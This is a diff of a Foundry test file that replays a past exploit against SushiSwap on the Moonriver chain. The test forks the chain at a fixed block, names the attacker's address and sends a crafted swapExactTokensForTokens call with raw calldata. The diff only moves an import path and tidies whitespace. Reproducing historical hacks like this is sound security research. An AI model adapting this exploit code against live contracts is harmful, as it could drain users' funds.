@@ -3,10 +3,9 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
-import {IERC20Metadata as IERC20} from "OpenZeppelin/interfaces/IERC20Metadata.sol";
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
 
 interface SushiRouter {
-
     function swapExactTokensForTokens(
         uint256 amountIn,
         uint256 amountOutMin,
@@ -14,17 +13,15 @@ interface SushiRouter {
         address to,
         uint256 deadline
     ) external;
-
 }
 
 contract ContractTest is Test {
-
     address attacker = 0x8d3d13cac607B7297Ff61A5E1E71072758AF4D01;
     address sushiSwapRouter = 0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506;
 
     function setUp() public {
         vm.createSelectFork("moonriver", 1_442_490); //fork moonriver at block 1442490
-            // https://moonriver.moonscan.io/tx/0x5a87c24d0665c8f67958099d1ad22e39a03aa08d47d00b7276b8d42294ee0591
+        // https://moonriver.moonscan.io/tx/0x5a87c24d0665c8f67958099d1ad22e39a03aa08d47d00b7276b8d42294ee0591
     }
 
     function testExploit() public {
@@ -35,7 +32,7 @@ contract ContractTest is Test {
         path[1] = 0x639A647fbe20b6c8ac19E48E2de44ea792c62c5C;
         // sushiSwapRouter.call(hex"38ed173900000000000000000000000000000000000000000000006c6b935b8bbd400000000000000000000000000000000000000000000000000000d30870ab532ed0c500000000000000000000000000000000000000000000000000000000000000a00000000000000000000000008d3d13cac607b7297ff61a5e1e71072758af4d010000000000000000000000000000000000000000000000000000000061fe94f80000000000000000000000000000000000000000000000000000000000000002000000000000000000000000868892cccedbff0b028f3b3595205ea91b99376b000000000000000000000000639a647fbe20b6c8ac19e48e2de44ea792c62c5c");
 
-        (bool success,) = sushiSwapRouter.call(
+        (bool success, ) = sushiSwapRouter.call(
             abi.encodeWithSignature(
                 "swapExactTokensForTokens(uint256,uint256,address[],address,uint256)",
                 2_000_000_000_000_000_000_000, // amountIn
@@ -46,5 +43,4 @@ contract ContractTest is Test {
             )
         );
     }
-
 }
